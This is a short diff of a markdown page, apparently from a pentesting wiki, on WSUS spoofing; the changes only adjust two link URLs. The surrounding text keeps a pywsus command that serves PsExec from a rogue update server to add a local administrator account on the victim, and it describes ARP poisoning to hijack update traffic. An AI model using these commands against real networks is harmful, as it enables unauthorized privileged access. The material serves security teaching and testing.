@@ -34,11 +34,11 @@ The evil WSUS server needs to be started before doing any ARP poisoning. The [py
 python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
 ```
 
-Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](../../../systems-and-services/privilege-escalation/windows/living-off-the-land.md) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io/#).
+Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](../../../systems-and-services/privilege-escalation/windows/living-off-the-land.md) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io).
 
 ### Poisoning and hijacking
 
-Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.
+Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.
 
 Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.
 
